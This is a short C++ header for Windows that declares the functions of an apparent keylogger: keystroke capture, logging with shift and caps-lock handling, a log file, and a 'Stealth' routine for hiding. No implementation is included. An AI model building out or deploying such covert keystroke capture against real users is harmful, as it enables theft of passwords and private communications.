#pragma once

#include <chrono>
#include <fstream>
#include <thread>
#include <Windows.h>
#include <WinUser.h>

void Keylog(std::ofstream& logFile);
void Log(int keyCode, std::ofstream& logFile, bool shifted, bool capsLockOn);
bool CreateOrOpenLogFile(std::ofstream& logFile);
void Stealth();